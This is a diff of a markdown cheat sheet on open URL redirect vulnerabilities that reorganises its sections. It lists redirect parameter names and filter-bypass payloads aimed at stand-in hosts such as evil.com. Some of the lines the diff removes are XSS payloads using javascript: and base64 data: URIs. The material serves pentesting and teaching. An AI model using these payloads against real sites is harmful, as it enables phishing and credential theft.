@@ -1,32 +1,28 @@
-# Open URL Redirection
+# Open URL Redirect
 
 > Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.
 
+
 ## Summary
 
+* [Methodology](#methodology)
+    * [HTTP Redirection Status Code](#http-redirection-status-code)
+    * [Redirect Methods](#redirect-methods)
+        * [Path-based Redirects](#path-based-redirects)
+        * [JavaScript-based Redirects](#javascript-based-redirects)
+        * [Common Query Parameters](#common-query-parameters)
+    * [Filter Bypass](#filter-bypass)
 * [Labs](#labs)
-* [Exploitation](#exploitation)
-  * [HTTP Redirection Status Code](#http-redirection-status-code)
-  * [Fuzzing](#fuzzing)
-  * [Filter Bypass](#filter-bypass)
-  * [Common injection parameters](#common-injection-parameters)
 * [References](#references)
 
 
-## Labs
-
-* [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
-* [PortSwigger - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
-
-
-## Exploitation
+## Methodology
 
 An open redirect vulnerability occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. This can allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing.
 
 Attackers can leverage this vulnerability in phishing campaigns, session theft, or forcing a user to perform an action without their consent.
 
-Consider this example:
-Your web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. This might be implemented like so:
+**Example**: A web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. This might be implemented like so:
 
 ```ps1
 https://example.com/redirect?url=https://userpreferredsite.com
@@ -49,152 +45,138 @@ HTTP Redirection status codes, those starting with 3, indicate that the client m
 - [308 Permanent Redirect](https://httpstatuses.com/308) - This means the resource has been permanently moved to the URL given by the Location headers, and future requests should use the new URI. It is similar to 301 but does not allow the HTTP method to change.
 
 
-## Fuzzing
+## Redirect Methods
 
-Replace `www.whitelisteddomain.tld` from *Open-Redirect-payloads.txt* with a specific white listed domain in your test case
+### Path-based Redirects
 
-To do this simply modify the `WHITELISTEDDOMAIN` with value `www.test.com `to your test case URL.
+Instead of query parameters, redirection logic may rely on the path:
+
+* Using slashes in URLs: `https://example.com/redirect/http://malicious.com`
+* Injecting relative paths: `https://example.com/redirect/../http://malicious.com`
+
+
+### JavaScript-based Redirects
+
+If the application uses JavaScript for redirects, attackers may manipulate script variables:
+
+**Example**:
+
+```js
+var redirectTo = "http://trusted.com";
+window.location = redirectTo;
+```
+
+**Payload**: `?redirectTo=http://malicious.com`
+
+
+### Common Parameters
 
 ```powershell
-WHITELISTEDDOMAIN="www.test.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
+?checkout_url={payload}
+?continue={payload}
+?dest={payload}
+?destination={payload}
+?go={payload}
+?image_url={payload}
+?next={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+?return_path={payload}
+?return_to={payload}
+?return={payload}
+?returnTo={payload}
+?rurl={payload}
+?target={payload}
+?url={payload}
+?view={payload}
+/{payload}
+/redirect/{payload}
 ```
 
 
 ## Filter Bypass
 
-Using a whitelisted domain or keyword
+* Using a whitelisted domain or keyword
+    ```powershell
+    www.whitelisted.com.evil.com redirect to evil.com
+    ```
 
-```powershell
-www.whitelisted.com.evil.com redirect to evil.com
-```
+* Using **CRLF** to bypass "javascript" blacklisted keyword
+    ```powershell
+    java%0d%0ascript%0d%0a:alert(0)
+    ```
 
-Using CRLF to bypass "javascript" blacklisted keyword
+* Using "`//`" and "`////`" to bypass "http" blacklisted keyword
+    ```powershell
+    //google.com
+    ////google.com
+    ```
 
-```powershell
-java%0d%0ascript%0d%0a:alert(0)
-```
+* Using "https:" to bypass "`//`" blacklisted keyword
+    ```powershell
+    https:google.com
+    ```
 
-Using "//" & "////" to bypass "http" blacklisted keyword
+* Using "`\/\/`" to bypass "`//`" blacklisted keyword
+    ```powershell
+    \/\/google.com/
+    /\/google.com/
+    ```
 
-```powershell
-//google.com
-////google.com
-```
+* Using "`%E3%80%82`" to bypass "." blacklisted character
+    ```powershell
+    /?redir=google。com
+    //google%E3%80%82com
+    ```
 
-Using "https:" to bypass "//" blacklisted keyword
+* Using null byte "`%00`" to bypass blacklist filter
+    ```powershell
+    //google%00.com
+    ```
 
-```powershell
-https:google.com
-```
+* Using HTTP Parameter Pollution
+    ```powershell
+    ?next=whitelisted.com&next=google.com
+    ```
 
-Using "\/\/" to bypass "//" blacklisted keyword (Browsers see \/\/ as //)
+* Using "@" character. [Common Internet Scheme Syntax](https://datatracker.ietf.org/doc/html/rfc1738)
+    ```powershell
+    //<user>:<password>@<host>:<port>/<url-path>
+    http://www.theirsite.com@yoursite.com/
+    ```
 
-```powershell
-\/\/google.com/
-/\/google.com/
-```
+* Creating folder as their domain
+    ```powershell
+    http://www.yoursite.com/http://www.theirsite.com/
+    http://www.yoursite.com/folder/www.folder.com
+    ```
 
-Using "%E3%80%82" to bypass "." blacklisted character
+* Using "`?`" character, browser will translate it to "`/?`"
+    ```powershell
+    http://www.yoursite.com?http://www.theirsite.com/
+    http://www.yoursite.com?folder/www.folder.com
+    ```
 
-```powershell
-/?redir=google。com
-//google%E3%80%82com
-```
-
-Using null byte "%00" to bypass blacklist filter
-
-```powershell
-//google%00.com
-```
-
-Using parameter pollution
-
-```powershell
-?next=whitelisted.com&next=google.com
-```
-
-Using "@" character, browser will redirect to anything after the "@"
-
-```powershell
-http://www.theirsite.com@yoursite.com/
-```
-
-Creating folder as their domain
-
-```powershell
-http://www.yoursite.com/http://www.theirsite.com/
-http://www.yoursite.com/folder/www.folder.com
-```
-
-Using "?" characted, browser will translate it to "/?"
-
-```powershell
-http://www.yoursite.com?http://www.theirsite.com/
-http://www.yoursite.com?folder/www.folder.com
-```
+* Host/Split Unicode Normalization
+    ```powershell
+    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
+    http://a.com／X.b.com
+    ```
 
 
-Host/Split Unicode Normalization
-```powershell
-https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
-http://a.com／X.b.com
-```
+## Labs
 
-XSS from Open URL - If it's in a JS variable
-
-```powershell
-";alert(0);//
-```
-
-XSS from data:// wrapper
-
-```powershell
-http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
-```
-
-XSS from javascript:// wrapper
-
-```powershell
-http://www.example.com/redirect.php?url=javascript:prompt(1)
-```
-
-
-## Common injection parameters
-
-```powershell
-/{payload}
-?next={payload}
-?url={payload}
-?target={payload}
-?rurl={payload}
-?dest={payload}
-?destination={payload}
-?redir={payload}
-?redirect_uri={payload}
-?redirect_url={payload}
-?redirect={payload}
-/redirect/{payload}
-/cgi-bin/redirect.cgi?{payload}
-/out/{payload}
-/out?{payload}
-?view={payload}
-/login?to={payload}
-?image_url={payload}
-?go={payload}
-?return={payload}
-?returnTo={payload}
-?return_to={payload}
-?checkout_url={payload}
-?continue={payload}
-?return_path={payload}
-```
+* [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
+* [PortSwigger - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
 
 
 ## References
 
-* [Open-Redirect-Payloads - cujanovic](https://github.com/cujanovic/Open-Redirect-Payloads)
-* [Host/Split Exploitable Antipatterns in Unicode Normalization - BlackHat US 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
-* [Open Redirect Vulnerability - AUGUST 15, 2018 - s0cket7](https://s0cket7.com/open-redirect-vulnerability/)
-* [OWASP - Unvalidated Redirects and Forwards Cheat Sheet](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
-* [Pentester Land - Open Redirect Cheat Sheet](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
-* [You do not need to run 80 reconnaissance tools to get access to user accounts - @stefanocoding](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
+- [Host/Split Exploitable Antipatterns in Unicode Normalization - Jonathan Birch - August 3, 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
+- [Open Redirect Cheat Sheet - PentesterLand - November 2, 2018](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
+- [Open Redirect Vulnerability - s0cket7 - August 15, 2018](https://s0cket7.com/open-redirect-vulnerability/)
+- [Open-Redirect-Payloads - Predrag Cujanović - April 24, 2017](https://github.com/cujanovic/Open-Redirect-Payloads)
+- [Unvalidated Redirects and Forwards Cheat Sheet - OWASP - February 28, 2024](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
+- [You do not need to run 80 reconnaissance tools to get access to user accounts - Stefano Vettorazzi (@stefanocoding) - May 16, 2019](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
